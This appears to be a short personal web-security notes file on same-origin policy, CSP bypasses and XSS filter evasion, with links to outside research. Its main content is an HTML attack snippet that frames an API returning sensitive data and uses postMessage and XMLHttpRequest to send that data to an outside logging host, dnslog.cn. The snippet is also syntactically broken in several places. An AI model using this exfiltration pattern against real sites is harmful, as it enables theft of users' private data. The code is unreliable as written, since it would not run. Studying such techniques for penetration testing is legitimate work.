# Striction
## SOP
## CSP
Content-Security-Policy
- Data protocol allowed: xss by iframe, combining postMessage to steal info
- [Bypass of CSP](https://csplite.com/csp320/)
- [bypassing-csp-with-policy-injection](https://portswigger.net/research/bypassing-csp-with-policy-injection)
```html
<html>
<body>
<iframe id='attack' src="http"//get_method_api_response_contains_sensitive_info/api"></iframe>
<script type="text/javascript">

var frame = document.getElementById("attack");
frame.addEventListener("load", function(){
  setTimeout(sendInfo,600)}
  )
 
function getInfo{
var payload = btoa(<script>                     #data protocol
    window.addEventListener(
     function(event)
       {xhr = new XMLHttpRequest();
        xhr.open("GET","http://dnslog.cn?message="+ event.data);
        xhr.send(null)}
     )
}     

function sendInfo{
 frames[0].postMessage("")
}
</script>
</body>
</html>
```
- [ClickJacking](https://resources.infosecinstitute.com/topic/bypassing-same-origin-policy-part-3-clickjacking-cursorjacking-filejacking/)


# Filter
- keyword
- characteristic
  - [iframe srcdoc](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp.md#iframes-in-xss)
  - /xxx/.source
- 
